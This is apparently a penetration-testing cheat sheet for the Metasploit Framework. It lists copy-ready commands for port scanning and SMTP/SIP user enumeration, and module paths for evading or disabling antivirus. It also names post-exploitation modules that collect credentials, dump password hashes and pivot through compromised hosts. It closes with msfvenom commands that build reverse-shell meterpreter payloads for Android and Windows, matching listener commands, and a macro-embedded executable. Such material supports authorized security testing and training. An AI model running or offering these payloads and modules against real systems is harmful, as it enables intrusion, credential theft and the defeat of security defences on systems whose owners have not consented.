# Metasploit Framework (www.metasploit.com)

Metasploit is a powerful open-source framework widely used for penetration testing, exploit development, and vulnerability assessment. It offers tools and modules for discovering, exploiting, and validating security vulnerabilities in systems, networks, and applications.

- Payload Module: Payload module establishes a communication channel between the Metasploit framework and the victim host
- Auxiliary Module: Auxiliary modules can be used to perform arbitrary, one-off actions such as port scanning, denial of service, and even fuzzing
- NOPS Module: NOPS modules generate a no-operation instruction used for blocking out buffers
- Encoder Module: Encoder modules are used to encode payloads to avoid detection by antivirussoftware, intrusion detection systems (IDS), and other security mechanisms
- Evasion Module: Evasion modules are designed to modify the behavior and characteristics of payloads and exploits to avoid detection by securitysystems, such as antivirus, IDS, and endpoint protection platforms
- Post-exploitation Module: 


--------------------------------------------------

# Auxiliary Module
- Enumeration
    - Port Scanning - Outputs the list of open ports from the target <ip>:
        msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS <ip>; run; exit"
    - Enumerate SMTP Users - Outputs the list of valid SMTP users from the target SMTP server:
        msfconsole -q -x "use auxiliary/scanner/smtp/smtp_enum; set RHOSTS <ip>; run; exit"
    - VoIP Enumeration - SIP Username Enumerator to scan numeric usernames/extensions of VoIP phones:
        msfconsole -q -x "use auxiliary/scanner/sip/enumerator; use auxiliary/scanner/sip/options; set RHOSTS <ip>; run; exit"

# Evasion Module
- Modifies Windows executable to bypass Windows Defender: evasion/windows/windows_defender_exe
- Attempts to disable antivirus software on target system: evasion/windows/antivirus_disable
- Attempts to disable antivirus software in Unix-based systems: evasion/unix/antivirus_disable

# Post-exploitation Module
- Windows Gather Modules:
    - Enumerates users currently logged into system: post/windows/gather/enum_logged_on_users
    - Collects various credentials stored in target system: post/windows/gather/credentials/credential_collector
- Linux Gather Modules:
    - Collects various configuration files from target system: post/linux/gather/enum_configs
    - Dumps password hashes from target Linux system: post/linux/gather/hashdump
- Network Pivoting Modules:
    - Adds route to target local network through compromised system: post/multi/manage/autoroute
    - Sets up port-forwarding rule for pivoting through compromised machine: post/windows/manage/portproxy
- Discover Live Hosts in Network:
    - run post/windows/gather/arp_scanner RHOSTS <target_subnet_range>

# Reverse Shell Payload for Android:
- Create Payload with MSFVenom
    msfvenom -p android/meterpreter/reverse_tcp LHOST=<receiver_ip> LPORT=<receiver_port> -o app_payload.apk
- Listen Incoming Connections:
    msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST=<receiver_ip>; set LPORT=<receiver_port>; exploit"


# TCP Payload (Windows):
- Create Payload with MSFVenom
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<receiver_ip> LPORT=<receiver_port> -f exe -o payload.exe
- Msfconsole Start Listener:
    msfconsole -qx "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST=<receiver_ip>; set LPORT=<receiver_port>; run"
- Embed Calculator within Macro:
    msfvenom -p generic/custom PAYLOADFILE=/home/user/Downloads/calc.exe -a x64 --platform windows -f vba-exe
